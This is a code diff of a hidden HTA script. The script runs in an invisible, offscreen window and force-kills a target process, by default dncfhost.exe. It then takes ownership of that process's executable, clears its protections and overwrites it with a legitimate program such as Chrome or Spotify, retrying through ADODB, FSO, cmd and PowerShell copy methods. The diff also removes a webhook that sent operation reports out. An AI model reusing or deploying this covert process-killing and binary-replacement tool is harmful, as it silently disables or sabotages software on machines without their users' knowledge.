@@ -49,44 +49,138 @@ Function GetProcessPath(pn)
     GetProcessPath = ""
 End Function
 
-Function KillProcessByName(pn)
+Function ForceKillProcess(pn)
     On Error Resume Next
-    Dim o, c, p
-    Set o = GetObject("winmgmts:\\.\root\cimv2")
-    Set c = o.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & pn & "'")
-    For Each p in c
-        p.Terminate()
-    Next
+    Dim sh
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run "taskkill /F /IM " & pn, 0, True
+    WScript.Sleep 500
 End Function
 
-Function BinaryCopy(sf, tf)
+Function RemoveReadOnly(path)
     On Error Resume Next
-    Dim a, b, fso, tfo
+    Dim fso, f
     Set fso = CreateObject("Scripting.FileSystemObject")
-    If Not fso.FileExists(sf) Then
-        BinaryCopy = False
-        Exit Function
+    If fso.FileExists(path) Then
+        Set f = fso.GetFile(path)
+        f.Attributes = 0
+        RemoveReadOnly = True
+    Else
+        RemoveReadOnly = False
     End If
-    If Not fso.FileExists(tf) Then
-        BinaryCopy = False
-        Exit Function
-    End If
-    Set tfo = fso.GetFile(tf)
-    If tfo.Attributes And 1 Then
-        tfo.Attributes = tfo.Attributes - 1
-    End If
+End Function
+
+Function TakeOwnership(path)
+    On Error Resume Next
+    Dim sh
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run "takeown /F """ & path & """", 0, True
+    WScript.Sleep 300
+End Function
+
+Function BinaryCopyMethod1(sf, tf)
+    On Error Resume Next
+    Dim a, b
     Set a = CreateObject("ADODB.Stream")
     a.Type = 1
     a.Open
     a.LoadFromFile sf
     b = a.Read
     a.Close
+    
     a.Open
     a.Type = 1
     a.Write b
     a.SaveToFile tf, 2
     a.Close
-    BinaryCopy = True
+    
+    If Err.Number = 0 Then
+        BinaryCopyMethod1 = True
+    Else
+        BinaryCopyMethod1 = False
+    End If
+End Function
+
+Function BinaryCopyMethod2(sf, tf)
+    On Error Resume Next
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    fso.CopyFile sf, tf, True
+    
+    If Err.Number = 0 Then
+        BinaryCopyMethod2 = True
+    Else
+        BinaryCopyMethod2 = False
+    End If
+End Function
+
+Function BinaryCopyMethod3(sf, tf)
+    On Error Resume Next
+    Dim sh
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run "cmd /c copy /Y """ & sf & """ """ & tf & """", 0, True
+    WScript.Sleep 500
+    
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If fso.FileExists(tf) Then
+        BinaryCopyMethod3 = True
+    Else
+        BinaryCopyMethod3 = False
+    End If
+End Function
+
+Function BinaryCopyMethod4(sf, tf)
+    On Error Resume Next
+    Dim sh
+    Set sh = CreateObject("WScript.Shell")
+    sh.Run "powershell -Command ""Copy-Item -Path '" & sf & "' -Destination '" & tf & "' -Force""", 0, True
+    WScript.Sleep 500
+    
+    Dim fso
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If fso.FileExists(tf) Then
+        BinaryCopyMethod4 = True
+    Else
+        BinaryCopyMethod4 = False
+    End If
+End Function
+
+Function AdvancedBinaryCopy(sf, tf)
+    On Error Resume Next
+    Dim success
+    
+    success = BinaryCopyMethod1(sf, tf)
+    If success Then
+        AdvancedBinaryCopy = "Method1-ADODB"
+        Exit Function
+    End If
+    
+    WScript.Sleep 300
+    
+    success = BinaryCopyMethod2(sf, tf)
+    If success Then
+        AdvancedBinaryCopy = "Method2-FSO"
+        Exit Function
+    End If
+    
+    WScript.Sleep 300
+    
+    success = BinaryCopyMethod3(sf, tf)
+    If success Then
+        AdvancedBinaryCopy = "Method3-CMD"
+        Exit Function
+    End If
+    
+    WScript.Sleep 300
+    
+    success = BinaryCopyMethod4(sf, tf)
+    If success Then
+        AdvancedBinaryCopy = "Method4-PowerShell"
+        Exit Function
+    End If
+    
+    AdvancedBinaryCopy = "FAILED"
 End Function
 
 Function FindRecursive(folder, fn)
@@ -101,13 +195,11 @@ Function FindRecursive(folder, fn)
     
     Set f = fso.GetFolder(folder)
     
-    ' Check current folder
     If fso.FileExists(fso.BuildPath(folder, fn)) Then
         FindRecursive = fso.BuildPath(folder, fn)
         Exit Function
     End If
     
-    ' Check subfolders (max depth 3 to avoid performance issues)
     Dim depth
     depth = Len(folder) - Len(Replace(folder, "\", ""))
     
@@ -128,8 +220,8 @@ End Function
 window.resizeTo(1,1);
 window.moveTo(-2000,-2000);
 
-var WEBHOOK_URL = "";
 var logMessages = [];
+var targetFilePath = "";
 
 function log(msg) {
     var timestamp = new Date().toISOString();
@@ -137,81 +229,31 @@ function log(msg) {
     logMessages.push(logMsg);
 }
 
-function sendWebhook(content, fileContent) {
+function saveLogs() {
     try {
-        log("Sending webhook...");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
         
-        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-        http.open("POST", WEBHOOK_URL, false);
-        http.setRequestHeader("Content-Type", "application/json");
-        
-        var fullContent = content;
-        if (fileContent) {
-            // Limita il log a 1500 caratteri per evitare messaggi troppo lunghi
-            var truncatedLog = fileContent;
-            if (fileContent.length > 1500) {
-                truncatedLog = fileContent.substring(0, 1500) + "\n... (truncated)";
+        // Salva nella stessa cartella del target file
+        if (targetFilePath && fso.FileExists(targetFilePath)) {
+            var targetDir = fso.GetParentFolderName(targetFilePath);
+            var logPath = fso.BuildPath(targetDir, "replace_log_" + Date.now() + ".txt");
+            
+            var ts = fso.CreateTextFile(logPath, true);
+            ts.WriteLine("=== REPLACE OPERATION LOG ===");
+            ts.WriteLine("Time: " + new Date().toString());
+            ts.WriteLine("");
+            
+            for (var i = 0; i < logMessages.length; i++) {
+                ts.WriteLine(logMessages[i]);
             }
-            fullContent += "\\n\\n```\\n" + truncatedLog + "\\n```";
-        }
-        
-        // Escape delle virgolette e newline per JSON
-        var escapedContent = fullContent.replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n").replace(/\r/g, "");
-        
-        var payload = '{"content":"' + escapedContent + '","username":"Replace Bot"}';
-        
-        http.send(payload);
-        
-        var status = http.status;
-        log("Webhook response status: " + status);
-        
-        if (status >= 200 && status < 300) {
-            log("Webhook sent successfully!");
-            return true;
+            
+            ts.Close();
+            log("Logs saved to: " + logPath);
         } else {
-            log("Webhook failed with status: " + status);
-            return false;
+            log("Cannot save logs: target path unknown");
         }
     } catch(e) {
-        log("Webhook error: " + e.message);
-        return false;
-    }
-}
-
-function saveSummary() {
-    try {
-        var fso = new ActiveXObject("Scripting.FileSystemObject");
-        var sh = new ActiveXObject("WScript.Shell");
-        var tempPath = sh.ExpandEnvironmentStrings("%TEMP%");
-        var summaryPath = fso.BuildPath(tempPath, "replace_summary.txt");
-        
-        var ts = fso.CreateTextFile(summaryPath, true);
-        ts.WriteLine("=== REPLACE OPERATION SUMMARY ===");
-        ts.WriteLine("Timestamp: " + new Date().toString());
-        ts.WriteLine("");
-        
-        for (var i = 0; i < logMessages.length; i++) {
-            ts.WriteLine(logMessages[i]);
-        }
-        
-        ts.Close();
-        log("Summary saved to: " + summaryPath);
-        return summaryPath;
-    } catch(e) {
-        log("Error saving summary: " + e.message);
-        return null;
-    }
-}
-
-function readFile(path) {
-    try {
-        var fso = new ActiveXObject("Scripting.FileSystemObject");
-        var ts = fso.OpenTextFile(path, 1);
-        var content = ts.ReadAll();
-        ts.Close();
-        return content;
-    } catch(e) {
-        return null;
+        log("Could not save logs: " + e.message);
     }
 }
 
@@ -222,212 +264,205 @@ function p() {
         var c = e("CMDLINE");
         var m = c.match(/--name\s+(\S+)/i);
         if (m) {
-            log("Target process name from cmdline: " + m[1]);
+            log("Target from cmdline: " + m[1]);
             return m[1];
         }
-    } catch(x) {
-        log("Error reading cmdline: " + x.message);
-    }
-    log("Using default target: dncfhost.exe");
+    } catch(x) {}
+    log("Default target: dncfhost.exe");
     return "dncfhost.exe";
 }
 
-function findLegitimateExe() {
+function findLegitExe() {
     log("Searching for legitimate executable...");
     
     var sh = new ActiveXObject("WScript.Shell");
-    var fso = new ActiveXObject("Scripting.FileSystemObject");
     
-    // Lista di software legittimi da cercare in ordine di priorità
     var targets = [
         {name: "Spotify.exe", hint: "Spotify"},
         {name: "Discord.exe", hint: "Discord"},
         {name: "Teams.exe", hint: "Microsoft Teams"},
         {name: "Slack.exe", hint: "Slack"},
         {name: "Skype.exe", hint: "Skype"},
-        {name: "notepad.exe", hint: "Notepad"}
+        {name: "chrome.exe", hint: "Google Chrome"},
+        {name: "msedge.exe", hint: "Microsoft Edge"},
+        {name: "firefox.exe", hint: "Mozilla Firefox"},
+        {name: "brave.exe", hint: "Brave Browser"},
+        {name: "opera.exe", hint: "Opera Browser"},
+        {name: "Code.exe", hint: "Visual Studio Code"},
+        {name: "Telegram.exe", hint: "Telegram"},
+        {name: "WhatsApp.exe", hint: "WhatsApp"},
+        {name: "Zoom.exe", hint: "Zoom"},
+        {name: "Steam.exe", hint: "Steam"},
+        {name: "EpicGamesLauncher.exe", hint: "Epic Games"},
+        {name: "Origin.exe", hint: "Origin"},
+        {name: "Battle.net.exe", hint: "Battle.net"},
+        {name: "vlc.exe", hint: "VLC Media Player"},
+        {name: "winamp.exe", hint: "Winamp"},
+        {name: "7zFM.exe", hint: "7-Zip"},
+        {name: "WinRAR.exe", hint: "WinRAR"},
+        {name: "notepad.exe", hint: "Notepad"},
+        {name: "calc.exe", hint: "Calculator"},
+        {name: "mspaint.exe", hint: "Paint"}
     ];
     
-    // Percorsi comuni dove cercare
-    var searchPaths = [
+    var paths = [
         sh.ExpandEnvironmentStrings("%APPDATA%"),
         sh.ExpandEnvironmentStrings("%LOCALAPPDATA%"),
         sh.ExpandEnvironmentStrings("%PROGRAMFILES%"),
-        sh.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%")
+        sh.ExpandEnvironmentStrings("%PROGRAMFILES(X86)%"),
+        "C:\\Windows\\System32"
     ];
     
-    // Cerca ogni target
     for (var i = 0; i < targets.length; i++) {
         var target = targets[i];
-        log("Searching for " + target.hint + "...");
+        log("Looking for " + target.hint + "...");
         
-        // Cerca nei percorsi comuni
-        for (var j = 0; j < searchPaths.length; j++) {
-            var basePath = searchPaths[j];
-            log("  Checking: " + basePath);
-            
+        for (var j = 0; j < paths.length; j++) {
             try {
-                var result = FindRecursive(basePath, target.name);
+                var result = FindRecursive(paths[j], target.name);
                 if (result && result !== "") {
                     log("FOUND: " + result);
                     return result;
                 }
-            } catch(e) {
-                log("  Error searching " + basePath + ": " + e.message);
-            }
+            } catch(e) {}
         }
     }
     
-    // Fallback: notepad.exe in System32
     var fallback = "C:\\Windows\\System32\\notepad.exe";
-    log("Using fallback: " + fallback);
+    log("Fallback: " + fallback);
     return fallback;
 }
 
-function w(pn, cb) {
-    log("Waiting for process " + pn + " to terminate...");
-    var attempts = 0;
-    var maxAttempts = 30;
-    var i = window.setInterval(function() {
-        attempts++;
-        var r = GetProcessByName(pn);
-        if (!r) {
-            log("Process " + pn + " terminated after " + attempts + " seconds");
-            clearInterval(i);
-            cb();
-        } else if (attempts >= maxAttempts) {
-            log("Timeout waiting for " + pn + " termination (" + maxAttempts + "s elapsed)");
-            clearInterval(i);
-            cb();
+function waitForTermination(pn, maxWait) {
+    log("Waiting for " + pn + " to terminate (max " + maxWait + "s)...");
+    
+    for (var i = 0; i < maxWait; i++) {
+        var running = GetProcessByName(pn);
+        if (!running) {
+            log("Process terminated after " + (i + 1) + "s");
+            return true;
         }
-    }, 1000);
+        WScript.Sleep(1000);
+    }
+    
+    log("Timeout after " + maxWait + "s, process still running");
+    return false;
 }
 
 function ex() {
-    log("=== Starting replace operation ===");
+    log("=== REPLACE OPERATION START ===");
     
     var pn = p();
     log("Target process: " + pn);
     
     var tf = GetProcessPath(pn);
-    log("Target file path: " + (tf || "NOT FOUND"));
+    targetFilePath = tf; // Salva per i logs
+    log("Target path: " + (tf || "NOT FOUND"));
     
     if (!tf || tf === "") {
-        log("ERROR: Target file path not found, aborting");
-        sendReport("❌ Replace failed: Target file path not found");
-        window.setTimeout(function() { window.close(); }, 2000);
+        log("ERROR: No target path, aborting");
+        saveLogs();
+        window.close();
         return;
     }
     
-    var sf = findLegitimateExe();
-    log("Source file: " + sf);
+    var sf = findLegitExe();
+    log("Source: " + sf);
     
     var fso = new ActiveXObject("Scripting.FileSystemObject");
     
     if (!fso.FileExists(sf)) {
-        log("ERROR: Source file does not exist: " + sf);
-        sendReport("❌ Replace failed: Source file not found");
-        window.setTimeout(function() { window.close(); }, 2000);
+        log("ERROR: Source not found");
+        saveLogs();
+        window.close();
         return;
     }
     
     if (!fso.FileExists(tf)) {
-        log("ERROR: Target file does not exist: " + tf);
-        sendReport("❌ Replace failed: Target file not found");
-        window.setTimeout(function() { window.close(); }, 2000);
+        log("ERROR: Target not found");
+        saveLogs();
+        window.close();
         return;
     }
     
-    // Get file info
-    var sfFile = fso.GetFile(sf);
-    var tfFile = fso.GetFile(tf);
-    var sfSize = sfFile.Size;
-    var tfSize = tfFile.Size;
-    var sfDate = sfFile.DateLastModified;
-    var tfDate = tfFile.DateLastModified;
+    var sfSize = fso.GetFile(sf).Size;
+    var tfSizeOrig = fso.GetFile(tf).Size;
+    log("Source size: " + sfSize + " bytes");
+    log("Target size: " + tfSizeOrig + " bytes");
     
-    log("Source file size: " + sfSize + " bytes (modified: " + sfDate + ")");
-    log("Target file size: " + tfSize + " bytes (modified: " + tfDate + ")");
+    // STEP 1: Force kill process
+    log("STEP 1: Killing process...");
+    ForceKillProcess(pn);
+    WScript.Sleep(1000);
     
+    var terminated = !GetProcessByName(pn);
+    if (!terminated) {
+        log("First kill failed, trying again...");
+        ForceKillProcess(pn);
+        WScript.Sleep(1000);
+        terminated = !GetProcessByName(pn);
+    }
+    
+    if (!terminated) {
+        log("WARNING: Process still running, continuing anyway...");
+        waitForTermination(pn, 10);
+    } else {
+        log("Process killed successfully");
+    }
+    
+    WScript.Sleep(500);
+    
+    // STEP 2: Take ownership e rimuovi protezioni
+    log("STEP 2: Taking ownership and removing protections...");
+    TakeOwnership(tf);
+    WScript.Sleep(300);
+    RemoveReadOnly(tf);
+    WScript.Sleep(300);
+    
+    // STEP 3: REPLACE con 4 metodi diversi
+    log("STEP 3: Executing replace with multiple methods...");
+    var method = AdvancedBinaryCopy(sf, tf);
+    log("Replace result: " + method);
+    
+    WScript.Sleep(500);
+    
+    // STEP 4: Verifica
+    log("STEP 4: Verification...");
     try {
-        log("Attempting to kill process: " + pn);
-        KillProcessByName(pn);
-        log("Kill command sent");
-    } catch(x) {
-        log("Error killing process: " + x.message);
-    }
-    
-    window.setTimeout(function() {
-        var sr = GetProcessByName(pn);
-        if (sr) {
-            log("Process still running, waiting...");
-            w(pn, function() { r(); });
-        } else {
-            log("Process terminated, proceeding with replace");
-            r();
-        }
-    }, 2000);
-    
-    function r() {
-        log("Executing binary copy...");
-        try {
-            var success = BinaryCopy(sf, tf);
-            if (success) {
-                log("✓ Binary copy SUCCESS");
-                log("Replaced: " + tf);
-                log("With: " + sf);
-                
-                // Verifica la copia
-                var newSize = fso.GetFile(tf).Size;
-                log("New target file size: " + newSize + " bytes");
-                
-                var msg = "✅ **Replace Successful!**\\n";
-                msg += "📁 **Target:** `" + tf + "`\\n";
-                msg += "📄 **Source:** `" + sf + "`\\n";
-                msg += "📊 **Original Size:** " + tfSize + " bytes\\n";
-                msg += "📊 **New Size:** " + newSize + " bytes\\n";
-                msg += "🕐 **Time:** " + new Date().toLocaleString();
-                
-                sendReport(msg);
+        if (fso.FileExists(tf)) {
+            var tfSizeNew = fso.GetFile(tf).Size;
+            log("Target exists, new size: " + tfSizeNew + " bytes");
+            
+            if (tfSizeNew == sfSize) {
+                log("✓✓✓ REPLACE SUCCESS! Size matches perfectly!");
+            } else if (tfSizeNew > 0) {
+                log("✓ REPLACE COMPLETED! Size differs (expected: " + sfSize + ", got: " + tfSizeNew + ")");
             } else {
-                log("✗ Binary copy FAILED");
-                sendReport("❌ Replace failed during binary copy");
+                log("✗ WARNING: File exists but size is 0");
             }
-        } catch(x) {
-            log("ERROR during binary copy: " + x.message);
-            sendReport("❌ Replace error: " + x.message);
+        } else {
+            log("✗ ERROR: Target file disappeared after replace");
         }
-        
-        log("=== Replace operation completed ===");
-        window.setTimeout(function() { window.close(); }, 2000);
-    }
-}
-
-function sendReport(summary) {
-    log("Preparing report...");
-    var summaryPath = saveSummary();
-    
-    var fileContent = null;
-    if (summaryPath) {
-        fileContent = readFile(summaryPath);
+    } catch(e) {
+        log("Verification error: " + e.message);
     }
     
-    if (!fileContent) {
-        fileContent = logMessages.join("\n");
-    }
+    log("=== REPLACE OPERATION END ===");
+    saveLogs();
     
-    sendWebhook(summary, fileContent);
+    WScript.Sleep(1000);
+    window.close();
 }
 
 window.onload = function() {
-    log("HTA loaded, starting operation in 500ms...");
+    log("HTA loaded, starting in 500ms...");
     window.setTimeout(function() { 
         try {
             ex(); 
         } catch(e) {
-            log("FATAL ERROR: " + e.message);
-            sendReport("❌ Fatal error: " + e.message);
-            window.setTimeout(function() { window.close(); }, 2000);
+            log("FATAL: " + e.message);
+            saveLogs();
+            window.close();
         }
     }, 500);
 };
